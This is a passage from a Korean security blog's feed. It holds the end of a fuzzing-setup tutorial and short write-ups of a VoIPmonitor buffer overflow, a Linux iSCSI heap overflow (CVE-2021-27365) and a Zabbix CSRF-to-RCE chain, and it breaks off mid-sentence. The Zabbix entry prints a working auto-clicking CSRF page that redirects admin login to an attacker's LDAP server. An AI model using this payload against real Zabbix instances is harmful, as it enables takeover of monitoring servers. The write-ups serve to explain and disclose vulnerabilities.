&#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xC9C0; &#xADF8;&#xB798;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC5B4;&#xB5BB;&#xAC8C; &#xD65C;&#xC6A9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xC8E0;. &#xD655;&#xC2E4;&#xD788; &#xB9AC;&#xBC84;&#xC2F1; &#xC18D;&#xB3C4;&#xB97C; &#xD5A5;&#xC0C1;&#xC2DC;&#xCF1C; &#xC8FC;&#xAE30;&#xB294; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; &#xCCAB; &#xBC88;&#xC9F8; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xBCF4;&#xBA74;</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image5.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; &#xB2F9;&#xC5F0;&#xD788; &#xD5E4;&#xB354;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xACE0; &#xB4A4;&#xC5D0; &#xD30C;&#xC77C;&#xC758; &#xC804;&#xCCB4; &#xC0AC;&#xC774;&#xC988; &#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC740; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC624;&#xD504;&#xC14B;&#xC744; &#xBCFC;&#xAC8C;&#xC5EC;</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image6.png" alt></p><p>&#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xAC00;&#xB85C; &#xC138;&#xB85C; &#xAE38;&#xC774;, &#xD574;&#xC0C1;&#xB3C4;, &#xC555;&#xCD95; &#xC5EC;&#xBD80; &#xB4F1;&#xB4F1;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC880; &#xB354; &#xB9CE;&#xB124;&#xC694;? &#xC704; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xB9CC; &#xC4F0;&#xC774;&#xACE0; &#xC2E4;&#xC81C; &#xCD9C;&#xB825;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC544;&#xB798; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB531;&#xD788; &#xC775;&#xC2A4;&#xC5D0;&#xB294; &#xB3C4;&#xC6C0;&#xC774; &#xC548; &#xB418;&#xB2C8; &#xADF8;&#xB0E5; &#xC774;&#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xACE0; &#xD544;&#xC694;&#xD55C; &#xAC70;&#xB294; &#xB4A4;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;. &#xB354; &#xC54C;&#xACE0; &#xC2F6;&#xC740; &#xBD84;&#xC740; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB420; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="http://www.soulfree.net/186">http://www.soulfree.net/186</a></p><p>&#xC774;&#xC81C; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB4E4;&#xB3C4; &#xC54C;&#xC558;&#xACE0; &#xD37C;&#xC800;&#xC5D0; &#xB3CC;&#xB824;&#xBCFC; &#xAC74;&#xB370; &#xD37C;&#xC800;&#xB97C; &#xB3CC;&#xB9AC;&#xAE30; &#xC804;&#xC5D0; &#xBD84;&#xC11D;&#xC744; &#xC880; &#xB354; &#xD3B8;&#xD558;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC800;&#xB9CC;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB123;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image7.jpg" alt></p><p>&#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xBD80;&#xBD84;&#xC758; &#xC55E;&#xBD80;&#xBD84;&#xC744; &#xC81C; &#xB2C9;&#xB124;&#xC784;&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xB098;&#xC911;&#xC5D0; &#xD06C;&#xB798;&#xC2DC; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xB54C; &#xB0B4; &#xD30C;&#xC77C;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xB978; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xB294; &#xC5C6;&#xC744; &#xBC95;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xCC44;&#xC6CC;&#xC8FC;&#xB294; &#xAC8C; &#xC88B;&#xC8E0;. AAAA &#xB098; BBBB &#xC774;&#xB7F0; &#xAC70;&#xB294; &#xB2E8;&#xC21C;&#xD574;&#xC11C; &#xB2E4;&#xB978; &#xC4F0;&#xB808;&#xAE30; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC800;&#xB294; &#xC81C; &#xB2C9;&#xB124;&#xC784;&#xC744; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xC77C; &#xB9E8; &#xB4A4;&#xC5D0;&#xB3C4; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xB05D;&#xAE4C;&#xC9C0; &#xB2E4; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB294; &#xC9C0;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xACA0;&#xC8E0;? &#xC774;&#xB807;&#xAC8C; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xD37C;&#xC800;&#xB97C; &#xB3CC;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xB450; &#xD30C;&#xD2B8;&#xC5D0; &#xAC70;&#xCCD0; &#xC6CC;&#xBC0D;&#xC5C5;&#xC774; &#xB9C8;&#xBB34;&#xB9AC; &#xB410;&#xB124;&#xC694;..! &#xB124; &#xC774;&#xC81C; &#xC2DC;&#xC791;&#xC774;&#xB77C;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;</p><p>&#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC800;&#xC758; &#xD06C;&#xB798;&#xC2DC; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD574;&#xBCFC; &#xAC74;&#xB370;&#xC694;. &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xC0BD;&#xC9C8;&#xC5D0; &#xC8FC;&#xC758;&#xD574;&#xC8FC;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xADF8;&#xB7FC; Part 3&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="Part-3-&#xC608;&#xACE0;"><a href="#Part-3-&#xC608;&#xACE0;" class="headerlink" title="Part 3 &#xC608;&#xACE0;"></a>Part 3 &#xC608;&#xACE0;</h2><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image8.png" alt></p><blockquote><p>&#xACE0;&#xC0DD;&#xC740; &#xC774;&#xC81C;&#xBD80;&#xD130; &#xC2DC;&#xC791;..</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄]VoIPmonitor BoF to RCE</title>
    <link href="/2021/03/17/fabu1ous/2021-03-17/"/>
    <url>/2021/03/17/fabu1ous/2021-03-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/EnableSecurity/advisories/tree/master/ES2021-03-voipmonitor-livesniffer-buffer-overflow">VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>VoIPmonitor 27.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; network packet sniffer&#xC778; VoIPmonitor&#xC5D0;&#xC11C; RCE&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-keyword">char</span> callidstr[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span>(packetS-&gt;sipDataLen) {    <span class="hljs-keyword">void</span> *memptr = memmem(packetS-&gt;data_()+ packetS-&gt;sipDataOffset,         packetS-&gt;sipDataLen, <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-number">2</span>);    <span class="hljs-keyword">if</span>(memptr) {        <span class="hljs-built_in">memcpy</span>(description, packetS-&gt;data_()+ packetS-&gt;sipDataOffset,             (<span class="hljs-keyword">char</span> *)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+ packetS-&gt;sipDataOffset));        description[(<span class="hljs-keyword">char</span>*)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+             packetS-&gt;sipDataOffset)] = <span class="hljs-string">&apos;\0&apos;</span>;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, description);    }    <span class="hljs-comment">// ...</span>}</code></pre><p>&#xC704;&#xB294; &#xD568;&#xC218; <code>save_packet_sqp</code>&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC218; <code>description</code>&#xC740; 1024 bytes &#xD06C;&#xAE30;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; SIP request &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBC30;&#xC5F4;&#xC785;&#xB2C8;&#xB2E4;. <code>description</code>&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070; request&#xB97C; &#xBCF4;&#xB0B4; &#xBC84;&#xD37C;&#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. Stack canary, RELRO &#xB4F1; &#xD45C;&#xC900; memory corruption &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC774; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xBC84;&#xD37C;&#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9;&#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bof</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27365: Linux 커널에서 발견된 15년간 존재한 권한상승 취약점</title>
    <link href="/2021/03/16/l0ch/2021-03-16/"/>
    <url>/2021/03/16/l0ch/2021-03-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/13/new-old-bugs-in-the-linux-kernel/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=new-old-bugs-in-the-linux-kernel">New Old Bugs in the Linux Kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux &#xBC30;&#xD3EC;&#xD310;(RHEL 8.1, 8.2 &#xBC0F; 8.3&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB428;)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux &#xCEE4;&#xB110;&#xC758; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; <a href="https://ko.wikipedia.org/wiki/SCSI">SCSI (Small Computer System Interface)</a>&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xBC30;&#xD3EC;&#xD310;&#xC5D0;&#xC11C; heap buffer overflow&#xC744; &#xD1B5;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 15&#xB144;&#xAC04; &#xC874;&#xC7AC;&#xD588;&#xB358; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>iscsi_session_get_param</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC720;&#xC800;&#xB294; &#xD638;&#xC2A4;&#xD2B8; &#xC774;&#xB984;, &#xC720;&#xC800; &#xC774;&#xB984;&#xACFC; &#xAC19;&#xC740; iSCSI &#xC5F0;&#xACB0;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC18D;&#xC131;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; iSCSI &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; netlink &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. netlink &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xCD5C;&#xB300; &#xAE38;&#xC774;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB530;&#xB77C; <code>2^32</code> &#xB610;&#xB294; <code>2^16</code> &#xD06C;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(param) {...<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_IFACE_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;ifacename);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_INITIATOR_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;initiatorname);<span class="hljs-keyword">break</span>;...</code></pre><p>&#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xAC01; &#xC18D;&#xC131;&#xC740; <code>sprintf</code> &#xD568;&#xC218;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xACE0; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB294; &#xCEE4;&#xB110;&#xC758; <code>PAGE_SIZE</code>&#xB85C; &#xC124;&#xC815;&#xB418;&#xBA70; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC18D;&#xC131;&#xC744; <code>PAGE_SIZE</code>&#xBCF4;&#xB2E4; &#xB9CE;&#xC774; &#xC785;&#xB825;&#xD558;&#xBA74; buffer overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xB41C; &#xCDE8;&#xC57D;&#xD55C; &#xBC30;&#xD3EC;&#xD310;&#xC740; <code>libiscsi</code> &#xCEE4;&#xB110; &#xBAA8;&#xB4C8;&#xC744; &#xC790;&#xB3D9; &#xB85C;&#xB4DC;&#xD558;&#xB294; CentOS &#xBC0F; RHEL &#xBC84;&#xC804; 8.1, 8.2, 8.3&#xC774;&#xBA70; &#xB2E4;&#xB978; &#xBC30;&#xD3EC;&#xD310; &#xB610;&#xD55C; &#xD574;&#xB2F9; &#xBAA8;&#xB4C8;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xACF5;&#xACA9; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC678; CVE-2021-27363(&#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130; &#xC720;&#xCD9C; &#xCDE8;&#xC57D;&#xC810;), CVE-2021-27364(&#xCEE4;&#xB110; OOB read &#xCDE8;&#xC57D;&#xC810;) &#xB610;&#xD55C; &#xB3D9;&#xC77C;&#xD55C; SCSI &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xD788;&#xC2A4;&#xD1A0;&#xB9AC;&#xB294; <a href="https://github.com/torvalds/linux/commit/ec98ea7070e94cc25a422ec97d1421e28d97b7ee#diff-156a34b787dc5569ae3b78903bbda80af9e2264786c6cb8efb16c7ee32bd4bca">torvalds/linux</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>heap bof</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27927: Zabbix에서 발견된 CSRF를 통한 RCE</title>
    <link href="/2021/03/15/idioth/2021-03-15/"/>
    <url>/2021/03/15/idioth/2021-03-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/12/cve-2021-27927-csrf-to-rce-chain-in-zabbix/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=cve-2021-27927-csrf-to-rce-chain-in-zabbix">CVE-2021-27927: CSRF to RCE Chain in Zabbix</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zabbix version &lt; 4.0.28rc1, 5.0.8rc1, 5.2.4rc1, 5.4.0alpha1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAE30;&#xC5C5;&#xC6A9; IT &#xB124;&#xD2B8;&#xC6CC;&#xD06C;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC194;&#xB8E8;&#xC158; Zabbix&#xC5D0;&#xC11C; CSRF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; Zabbix UI&#xC758; &#xC778;&#xC99D; &#xBD80;&#xBD84;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70;, CSRF&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; Zabbix &#xAD00;&#xB9AC;&#xC790;&#xAC00; &#xC545;&#xC131; &#xB9C1;&#xD06C;&#xB97C; &#xC811;&#xC18D;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xC5EC; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <a href="https://www.hahwul.com/2020/01/18/samesite-lax/"><code>SameSite=Lax</code> &#xCFE0;&#xD0A4; &#xBCF4;&#xD638;</a>&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xBAA8;&#xB4E0; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Zabbix&#xB294; request body&#xC758; <code>sid</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; anti-CSRF &#xD1A0;&#xD070;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; CSRF &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC778;&#xC99D; &#xC124;&#xC815; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; anti-CSRF &#xD1A0;&#xD070;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; Zabbix&#xB294; POST request&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; GET&#xC744; &#xD1B5;&#xD574; URL &#xCFFC;&#xB9AC; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC778;&#xC99D; &#xC124;&#xC815; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; GET request&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74;, <code>sid</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; &#xC5C6;&#xC5B4;&#xB3C4; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xC21C;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xD0C0;&#xAE43; Zabbix &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; LDAP &#xC11C;&#xBC84;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC545;&#xC131; HTML &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC0BD;&#xC785;&#xD55C; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; exploit &#xCF54;&#xB4DC;&#xC758; &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Any web site<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;link&apos;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&apos;http://192.168.0.140/zabbix.php?form_refresh=1&amp;action=authentication.update&amp;db_authentication_type=0&amp;authentication_type=1&amp;http_auth_enabled=0&amp;ldap_configured=1&amp;ldap_host=10.0.229.1&amp;ldap_port=389&amp;ldap_base_dn=dc%3Dsmoke%2Cdc%3Dnet&amp;ldap_search_attribute=sAMAccountName&amp;ldap_bind_dn=cn%3DAdmin%2CCN%3DUsers%2CDC%3Dsmoke%2CDC%3Dnet&amp;ldap_case_sensitive=1&amp;action_passw_change=authentication.edit&amp;ldap_test_user=Admin&amp;ldap_test_password=Z@bb1x!&amp;saml_auth_enabled=0&amp;update=Update&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;link&apos;</span>).click();</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></li><li><p>Zabbix &#xAD00;&#xB9AC;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74;, &#xC778;&#xC99D; &#xC124;&#xC815;&#xC774; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xD574;&#xCEE4;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xC790;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xD574;&#xCEE4;&#xB294; Zabbix&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC124;&#xC815;&#xC774; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBA74; 